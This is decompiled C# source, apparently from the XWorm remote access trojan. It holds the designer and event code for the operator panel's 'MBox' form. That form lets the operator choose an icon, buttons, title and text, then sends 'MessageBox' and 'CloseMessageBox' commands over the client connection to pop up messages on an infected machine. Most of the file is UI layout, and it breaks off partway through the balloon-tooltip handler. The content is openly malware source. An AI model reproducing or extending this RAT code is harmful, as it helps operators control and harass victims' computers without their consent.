#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;


namespace XWorm;

[DesignerGenerated]
public class MBox : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2ComboBox1")]
	private Guna2ComboBox _Guna2ComboBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2ComboBox3")]
	private Guna2ComboBox _Guna2ComboBox3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton2")]
	private Guna2GradientButton _Guna2GradientButton2;

	public GClass5 gclass5_0;

	[field: AccessedThroughProperty("ImageList1")]
	public ImageList ImageList1
;
	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;
	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	[field: AccessedThroughProperty("Label2")]
	public Label Label2
	;

	[field: AccessedThroughProperty("PictureBox1")]
	public PictureBox PictureBox1
	;

	[field: AccessedThroughProperty("Label4")]
	public Label Label4
	;

	[field: AccessedThroughProperty("Label3")]
	public Label Label3
	;

	[field: AccessedThroughProperty("Label6")]
	public Label Label6
	;

	[field: AccessedThroughProperty("Label7")]
	public Label Label7
	;


	[field: AccessedThroughProperty("PictureBox2")]
	public PictureBox PictureBox2
	;

	[field: AccessedThroughProperty("Label5")]
	public Label Label5
	;

	[field: AccessedThroughProperty("Guna2TabControl1")]
	public Guna2TabControl Guna2TabControl1
	;

	[field: AccessedThroughProperty("TabPage1")]
	public TabPage TabPage1
	;

	[field: AccessedThroughProperty("TabPage2")]
	public TabPage TabPage2
	;

	public Guna2GradientButton Guna2GradientButton1
	;

	public Guna2ComboBox Guna2ComboBox1
	;

	[field: AccessedThroughProperty("Guna2ComboBox2")]
	public Guna2ComboBox Guna2ComboBox2
	;

	[field: AccessedThroughProperty("Guna2TextBox1")]
	public Guna2TextBox Guna2TextBox1
	;

	[field: AccessedThroughProperty("Guna2TextBox2")]
	public Guna2TextBox Guna2TextBox2
	;

	public Guna2ComboBox Guna2ComboBox3
;

	public Guna2GradientButton Guna2GradientButton2
	;

	[field: AccessedThroughProperty("Guna2TextBox4")]
	public Guna2TextBox Guna2TextBox4
	;

	[field: AccessedThroughProperty("Guna2TextBox3")]
	public Guna2TextBox Guna2TextBox3
	;


	public MBox()
	{
		base.Load += MBox_Load;
		base.FormClosing += MBox_FormClosing;
		InitializeComponent();
		this.ImageList1.Images.SetKeyName(0, "icons8-letter-16.png");
		this.ImageList1.Images.SetKeyName(1, "comments.png");
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.MBox));
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Label4 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.Label7 = new System.Windows.Forms.Label();
		this.PictureBox2 = new System.Windows.Forms.PictureBox();
		this.Label5 = new System.Windows.Forms.Label();
		this.Guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2ComboBox3 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.StatusStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).BeginInit();
		this.Guna2TabControl1.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Guna2ComboBox1.SelectedIndexChanged += new System.EventHandler(Guna2ComboBox1_SelectedIndexChanged);
		this.Guna2ComboBox3.SelectedIndexChanged += new System.EventHandler(Guna2ComboBox3_SelectedIndexChanged);
		this.Guna2GradientButton2.Click += new System.EventHandler(Guna2GradientButton2_Click);
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 298);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(479, 22);
		this.StatusStrip1.TabIndex = 11;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.Label4.AutoSize = true;
		this.Label4.ForeColor = System.Drawing.Color.Black;
		this.Label4.Location = new System.Drawing.Point(13, 140);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(49, 13);
		this.Label4.TabIndex = 7;
		this.Label4.Text = "Message";
		this.Label3.AutoSize = true;
		this.Label3.ForeColor = System.Drawing.Color.Black;
		this.Label3.Location = new System.Drawing.Point(13, 100);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(72, 13);
		this.Label3.TabIndex = 5;
		this.Label3.Text = "Message Title";
		this.Label2.AutoSize = true;
		this.Label2.ForeColor = System.Drawing.Color.Black;
		this.Label2.Location = new System.Drawing.Point(13, 48);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(99, 13);
		this.Label2.TabIndex = 3;
		this.Label2.Text = "MessageBoxButton";
		this.PictureBox1.Location = new System.Drawing.Point(176, 24);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(22, 22);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 2;
		this.PictureBox1.TabStop = false;
		this.PictureBox1.Visible = false;
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(13, 8);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(88, 13);
		this.Label1.TabIndex = 0;
		this.Label1.Text = "MessageBoxIcon";
		this.Label6.AutoSize = true;
		this.Label6.ForeColor = System.Drawing.Color.Black;
		this.Label6.Location = new System.Drawing.Point(14, 118);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(29, 13);
		this.Label6.TabIndex = 12;
		this.Label6.Text = "Text";
		this.Label7.AutoSize = true;
		this.Label7.ForeColor = System.Drawing.Color.Black;
		this.Label7.Location = new System.Drawing.Point(14, 78);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(27, 13);
		this.Label7.TabIndex = 10;
		this.Label7.Text = "Title";
		this.PictureBox2.Location = new System.Drawing.Point(177, 41);
		this.PictureBox2.Name = "PictureBox2";
		this.PictureBox2.Size = new System.Drawing.Size(22, 22);
		this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox2.TabIndex = 5;
		this.PictureBox2.TabStop = false;
		this.PictureBox2.Visible = false;
		this.Label5.AutoSize = true;
		this.Label5.ForeColor = System.Drawing.Color.Black;
		this.Label5.Location = new System.Drawing.Point(14, 25);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(28, 13);
		this.Label5.TabIndex = 3;
		this.Label5.Text = "Icon";
		this.Guna2TabControl1.Controls.Add(this.TabPage1);
		this.Guna2TabControl1.Controls.Add(this.TabPage2);
		this.Guna2TabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2TabControl1.ImageList = this.ImageList1;
		this.Guna2TabControl1.ItemSize = new System.Drawing.Size(140, 30);
		this.Guna2TabControl1.Location = new System.Drawing.Point(0, 0);
		this.Guna2TabControl1.Name = "Guna2TabControl1";
		this.Guna2TabControl1.SelectedIndex = 0;
		this.Guna2TabControl1.Size = new System.Drawing.Size(479, 298);
		this.Guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(216, 214, 228);
		this.Guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(216, 214, 228);
		this.Guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.Black;
		this.Guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.Black;
		this.Guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TabControl1.TabButtonSize = new System.Drawing.Size(140, 30);
		this.Guna2TabControl1.TabIndex = 91;
		this.Guna2TabControl1.TabMenuBackColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
		this.TabPage1.BackColor = System.Drawing.Color.White;
		this.TabPage1.Controls.Add(this.Guna2TextBox2);
		this.TabPage1.Controls.Add(this.Guna2TextBox1);
		this.TabPage1.Controls.Add(this.Guna2ComboBox2);
		this.TabPage1.Controls.Add(this.Label4);
		this.TabPage1.Controls.Add(this.Guna2ComboBox1);
		this.TabPage1.Controls.Add(this.Guna2GradientButton1);
		this.TabPage1.Controls.Add(this.Label3);
		this.TabPage1.Controls.Add(this.Label1);
		this.TabPage1.Controls.Add(this.PictureBox1);
		this.TabPage1.Controls.Add(this.Label2);
		this.TabPage1.ImageKey = "icons8-letter-16.png";
		this.TabPage1.Location = new System.Drawing.Point(4, 34);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage1.Size = new System.Drawing.Size(471, 260);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "MessageBox";
		this.TabPage2.BackColor = System.Drawing.Color.White;
		this.TabPage2.Controls.Add(this.Guna2GradientButton2);
		this.TabPage2.Controls.Add(this.Guna2TextBox4);
		this.TabPage2.Controls.Add(this.Guna2TextBox3);
		this.TabPage2.Controls.Add(this.Guna2ComboBox3);
		this.TabPage2.Controls.Add(this.Label6);
		this.TabPage2.Controls.Add(this.Label5);
		this.TabPage2.Controls.Add(this.PictureBox2);
		this.TabPage2.Controls.Add(this.Label7);
		this.TabPage2.ImageKey = "comments.png";
		this.TabPage2.Location = new System.Drawing.Point(4, 34);
		this.TabPage2.Name = "TabPage2";
		this.TabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage2.Size = new System.Drawing.Size(471, 260);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = "BallonTooltip";
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton1.Image");
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(16, 225);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(438, 27);
		this.Guna2GradientButton1.TabIndex = 56;
		this.Guna2GradientButton1.Text = "Ok";
		this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.BorderRadius = 3;
		this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox1.ItemHeight = 15;
		this.Guna2ComboBox1.Items.AddRange(new object[5] { "Information", "Question", "Warning", "Error", "None" });
		this.Guna2ComboBox1.Location = new System.Drawing.Point(16, 24);
		this.Guna2ComboBox1.Name = "Guna2ComboBox1";
		this.Guna2ComboBox1.Size = new System.Drawing.Size(154, 21);
		this.Guna2ComboBox1.TabIndex = 94;
		this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.BorderRadius = 3;
		this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox2.ItemHeight = 15;
		this.Guna2ComboBox2.Items.AddRange(new object[6] { "YesNo", "YesNoCancel", "OK", "OKCancel", "RetryCancel", "AbortRetryIgnore" });
		this.Guna2ComboBox2.Location = new System.Drawing.Point(16, 64);
		this.Guna2ComboBox2.Name = "Guna2ComboBox2";
		this.Guna2ComboBox2.Size = new System.Drawing.Size(154, 21);
		this.Guna2ComboBox2.TabIndex = 95;
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "MessageBox";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(16, 116);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(438, 21);
		this.Guna2TextBox1.TabIndex = 96;
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "Hello World!";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Location = new System.Drawing.Point(16, 156);
		this.Guna2TextBox2.Multiline = true;
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(438, 63);
		this.Guna2TextBox2.TabIndex = 97;
		this.Guna2ComboBox3.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox3.BorderRadius = 3;
		this.Guna2ComboBox3.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox3.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox3.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox3.ItemHeight = 15;
		this.Guna2ComboBox3.Items.AddRange(new object[4] { "Info", "Warning", "Error", "None" });
		this.Guna2ComboBox3.Location = new System.Drawing.Point(17, 41);
		this.Guna2ComboBox3.Name = "Guna2ComboBox3";
		this.Guna2ComboBox3.Size = new System.Drawing.Size(154, 21);
		this.Guna2ComboBox3.TabIndex = 96;
		this.Guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox3.BorderRadius = 3;
		this.Guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox3.DefaultText = "Hello World!";
		this.Guna2TextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Location = new System.Drawing.Point(17, 134);
		this.Guna2TextBox3.Multiline = true;
		this.Guna2TextBox3.Name = "Guna2TextBox3";
		this.Guna2TextBox3.PasswordChar = '\0';
		this.Guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.PlaceholderText = "";
		this.Guna2TextBox3.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.Guna2TextBox3.SelectedText = "";
		this.Guna2TextBox3.Size = new System.Drawing.Size(438, 74);
		this.Guna2TextBox3.TabIndex = 97;
		this.Guna2TextBox4.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox4.BorderRadius = 3;
		this.Guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox4.DefaultText = "BalloonTip";
		this.Guna2TextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox4.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Location = new System.Drawing.Point(17, 94);
		this.Guna2TextBox4.Name = "Guna2TextBox4";
		this.Guna2TextBox4.PasswordChar = '\0';
		this.Guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.PlaceholderText = "";
		this.Guna2TextBox4.SelectedText = "";
		this.Guna2TextBox4.Size = new System.Drawing.Size(438, 21);
		this.Guna2TextBox4.TabIndex = 98;
		this.Guna2GradientButton2.BorderRadius = 4;
		this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton2.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton2.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton2.Image");
		this.Guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton2.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton2.Location = new System.Drawing.Point(17, 214);
		this.Guna2GradientButton2.Name = "Guna2GradientButton2";
		this.Guna2GradientButton2.Size = new System.Drawing.Size(438, 27);
		this.Guna2GradientButton2.TabIndex = 99;
		this.Guna2GradientButton2.Text = "Ok";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(479, 320);
		base.Controls.Add(this.Guna2TabControl1);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "MBox";
		this.Text = "MessageBox";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).EndInit();
		this.Guna2TabControl1.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage1.PerformLayout();
		this.TabPage2.ResumeLayout(false);
		this.TabPage2.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void MBox_Load(object sender, EventArgs e)
	{
		Guna2ComboBox1.SelectedIndex = 0;
		Guna2ComboBox2.SelectedIndex = 2;
		Guna2ComboBox3.SelectedIndex = 0;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void MBox_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseMessageBox");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("MessageBox" + GClass19.string_0 + Guna2ComboBox2.Text + GClass19.string_0 + Guna2ComboBox1.Text + GClass19.string_0 + Guna2TextBox1.Text + GClass19.string_0 + Guna2TextBox2.Text);
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2ComboBox1.Text, "None", TextCompare: false) == 0)
		{
			PictureBox1.Image = null;
			PictureBox1.Visible = false;
		}
		if (Operators.CompareString(Guna2ComboBox1.Text, "Information", TextCompare: false) == 0)
		{
			PictureBox1.Visible = true;
			PictureBox1.Image = XWorm_Resources.Information;
		}
		if (Operators.CompareString(Guna2ComboBox1.Text, "Question", TextCompare: false) == 0)
		{
			PictureBox1.Visible = true;
			PictureBox1.Image = XWorm_Resources.Question;
		}
		if (Operators.CompareString(Guna2ComboBox1.Text, "Warning", TextCompare: false) == 0)
		{
			PictureBox1.Visible = true;
			PictureBox1.Image = XWorm_Resources.Warning;
		}
		if (Operators.CompareString(Guna2ComboBox1.Text, "Error", TextCompare: false) == 0)
		{
			PictureBox1.Visible = true;
			PictureBox1.Image = XWorm_Resources._Error;
		}
	}

	private void Guna2ComboBox3_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2ComboBox3.Text, "None", TextCompare: false) == 0)
		{
			PictureBox2.Image = null;
			PictureBox2.Visible = false;
		}
		if (Operators.CompareString(Guna2ComboBox3.Text, "Info", TextCompare: false) == 0)
		{
			PictureBox2.Visible = true;
			PictureBox2.Image = XWorm_Resources.Information;
		}
		if (Operators.CompareString(Guna2ComboBox3.Text, "Warning", TextCompare: false) == 0)
		{
			PictureBox2.Visible = true;
